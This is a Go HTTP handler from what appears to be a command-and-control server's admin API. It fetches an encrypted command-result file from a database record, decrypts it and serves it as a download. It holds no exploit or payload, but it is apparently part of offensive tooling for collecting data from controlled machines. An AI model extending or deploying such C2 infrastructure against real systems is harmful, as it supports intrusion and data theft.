package admin

import (
	"c2/database"
	"c2/utils"
	"net/http"
	"os"
	"path/filepath"

	"github.com/gorilla/mux"
)

// DownloadFile decrypts and sends the requested command result file to the admin.
//
// @Summary Download command result file
// @Description Decrypts the encrypted command result file and sends it to the admin as a downloadable file.
// @Tags Admin - Commands
// @Param command_id path string true "Command ID"
// @Param nonce query string true "Nonce for decryption"
// @Success 200 {file} string "Decrypted command result file"
// @Failure 400 {string} string "Invalid nonce"
// @Failure 404 {string} string "No result found"
// @Failure 500 {string} string "Failed to decrypt file"
// @Router /admin/commands/{command_id}/download [get]
func DownloadFile(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	commandID := vars["command_id"]

	db := database.Connect()
	defer db.Close()

	var result string
	err := db.QueryRow(`
		SELECT result FROM commands WHERE id = ?`, commandID).Scan(&result)
	if err != nil {
		http.Error(w, "Failed to get command result", http.StatusInternalServerError)
		return
	}

	if result == "" {
		http.Error(w, "No result found", http.StatusNotFound)
		return
	}

	encryptedFile, err := os.ReadFile(result)
	if err != nil {
		http.Error(w, "Failed to read encrypted file", http.StatusInternalServerError)
		return
	}

	nonce, err := utils.DecodeNonce(r.URL.Query().Get("nonce"))
	if err != nil {
		http.Error(w, "Invalid nonce", http.StatusBadRequest)
		return
	}

	decryptedContent, err := utils.DecryptFile(encryptedFile, nonce)
	if err != nil {
		http.Error(w, "Failed to decrypt file", http.StatusInternalServerError)
		return
	}

	w.Header().Set("Content-Type", "application/octet-stream")
	w.Header().Set("Content-Disposition", "attachment; filename=\""+filepath.Base(result)+"\"")
	w.Write(decryptedContent)
}
